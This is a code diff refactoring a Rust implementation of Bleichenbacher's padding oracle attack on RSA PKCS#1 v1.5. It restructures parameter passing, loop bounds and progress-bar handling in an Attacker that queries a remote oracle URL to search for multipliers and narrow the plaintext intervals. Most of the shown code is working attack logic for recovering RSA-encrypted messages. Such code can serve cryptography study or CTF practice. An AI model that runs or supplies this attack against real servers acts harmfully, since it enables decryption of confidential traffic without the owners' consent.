@@ -50,6 +50,7 @@ impl Oracle {
 pub struct Attacker {
     pub oracle: Oracle,
     pub state: AttackState,
+    pbars: (Arc<MultiProgress>, ProgressBar),
 }
 
 impl Attacker {
@@ -64,19 +65,16 @@ impl Attacker {
         let state = AttackState::new(rsa_pubkey, cipher);
         let oracle = Oracle::new(url);
 
-        Ok(Self { oracle, state })
+        let pbars = Self::progress_bars();
+
+        Ok(Self { oracle, state, pbars })
     }
 
     #[allow(clippy::too_many_arguments)]
     fn find_s_parallel(
         &self,
-        c: &BigUint,
-        e: &BigUint,
-        n: &BigUint,
-        k: usize,
-        oracle: &Oracle,
-        mut s_start: BigUint,
-        s_upper: Option<&BigUint>,
+        vars: (&BigUint, &BigUint, &BigUint, usize),
+        s_range: (BigUint, Option<&BigUint>),
         mp: Arc<MultiProgress>,
     ) -> Result<BigUint, CustomError> {
         let num_workers = rayon::current_num_threads();
@@ -99,7 +97,9 @@ impl Attacker {
         let probe_counters: Vec<AtomicU64> = (0..num_workers).map(|_| AtomicU64::new(0)).collect();
         let probe_counters = Arc::new(probe_counters);
 
-        let oracle = Arc::new(oracle);
+        let oracle = Arc::new(&self.oracle);
+        let (c, e, n, k) = vars;
+        let (mut s_start, s_upper) = s_range;
 
         let probe = |cprime: BigUint| -> bool {
             oracle.is_pkcs1_compliant(&cprime, k).unwrap_or_else(|e| {
@@ -108,16 +108,16 @@ impl Attacker {
             })
         };
 
-        while s_upper.is_none() || &s_start <= s_upper.unwrap() {
+        while s_upper.is_none() || &s_start < s_upper.unwrap() {
+            let batch_end = if let Some(upper) = s_upper {
+                std::cmp::min(&s_start + BigUint::from(BATCH_SIZE as u32), upper.clone())
+            } else {
+                &s_start + BigUint::from(BATCH_SIZE as u32)
+            };
+
             let candidates: Vec<BigUint> = (0..BATCH_SIZE)
                 .map(|i| &s_start + BigUint::from(i as u32))
-                .filter(|s_candidate| {
-                    if let Some(s_upper) = s_upper {
-                        s_candidate <= s_upper
-                    } else {
-                        true
-                    }
-                })
+                .take_while(|s| s_upper.is_none() || s < s_upper.unwrap())
                 .collect();
 
             let successes: Vec<BigUint> = candidates
@@ -173,24 +173,15 @@ impl Attacker {
             ));
         }
 
-        let mp = Arc::new(MultiProgress::new());
-        let main_pb = mp.add(ProgressBar::new_spinner());
-        main_pb.set_style(
-            ProgressStyle::with_template("[{elapsed_precise}] {msg} {spinner}")
-                .unwrap()
-                .tick_chars("'°º¤ø,¸¸,ø¤º°'"),
-        );
-        main_pb.enable_steady_tick(Duration::from_millis(100));
-        main_pb.set_message("Es geht um die Wurst".to_string());
+        let (mp, main_pb) = &self.pbars;
 
         // easier access to state variables
-        let n = self.state.n.clone();
+        let c = self.state.c.clone();
         let e = self.state.e.clone();
-        let B = self.state.B.clone();
+        let n = self.state.n.clone();
         let k = self.state.k;
 
-        let c = self.state.c.clone();
-
+        let B = self.state.B.clone();
         let B2 = 2u8 * &B;
         let B3 = 3u8 * &B;
 
@@ -205,7 +196,7 @@ impl Attacker {
             };
 
             if self.state.it == 1 || self.state.M.len() >= 2 {
-                // parallel step2a / 2b
+                // parallel step 2a / 2b
                 main_pb.set_message(if self.state.it == 1 {
                     "step 2a".to_string()
                 } else {
@@ -213,13 +204,8 @@ impl Attacker {
                 });
 
                 s_i = self.find_s_parallel(
-                    &c,
-                    &e,
-                    &n,
-                    k,
-                    &self.oracle,
-                    s_i.clone(),
-                    None,
+                    (&c, &e, &n, k),
+                    (s_i.clone(), None),
                     mp.clone(),
                 )?;
             } else {
@@ -233,18 +219,13 @@ impl Attacker {
                 s_i = ceiling_div(&(&B2 + &r_i * &n), b);
 
                 main_pb.set_message(format!(
-                    "step 2c | iter={} | s={} | r={} | M=[{}, {}]",
-                    self.state.it, s_i, r_i, a, b
+                    "step 2c | iter={} | s={} | r={} ",
+                    self.state.it, s_i, r_i
                 ));
 
                 while match self.find_s_parallel(
-                    &c,
-                    &e,
-                    &n,
-                    k,
-                    &self.oracle,
-                    s_i.clone(),
-                    Some(&s_upper),
+                    (&c, &e, &n, k),
+                    (s_i.clone(), Some(&s_upper)),
                     mp.clone(),
                 ) {
                     Ok(found_s) => {
@@ -254,8 +235,8 @@ impl Attacker {
                     Err(_) => true,
                 } {
                     main_pb.set_message(format!(
-                        "step 2c | iter={} | s={} | r={} | M=[{}, {}]",
-                        self.state.it, s_i, r_i, a, b
+                        "step 2c | iter={} | s={} | r={}",
+                        self.state.it, s_i, r_i
                     ));
 
                     r_i += 1u8;
@@ -306,6 +287,20 @@ impl Attacker {
         let (m, _) = &self.state.M[0]; // only one interval left
 
         Ok(m.clone())
+    }
+
+    fn progress_bars() -> (Arc<MultiProgress>, ProgressBar) {
+        let mp = Arc::new(MultiProgress::new());
+        let main_pb = mp.add(ProgressBar::new_spinner());
+        main_pb.set_style(
+            ProgressStyle::with_template("[{elapsed_precise}] {msg} {spinner}")
+                .unwrap()
+                .tick_chars("'°º¤ø,¸¸,ø¤º°'"),
+        );
+        main_pb.enable_steady_tick(Duration::from_millis(100));
+        main_pb.set_message("Es geht um die Wurst".to_string());
+
+        (mp, main_pb)
     }
 }
 
@@ -373,7 +368,7 @@ impl AttackState {
     pub fn combine_intervals(&mut self) {
         self.M.sort();
 
-        let mut combined = vec![];
+        let mut combined = Vec::<Interval>::new();
         for interval_a in self.M.iter() {
             let mut found = false;
 
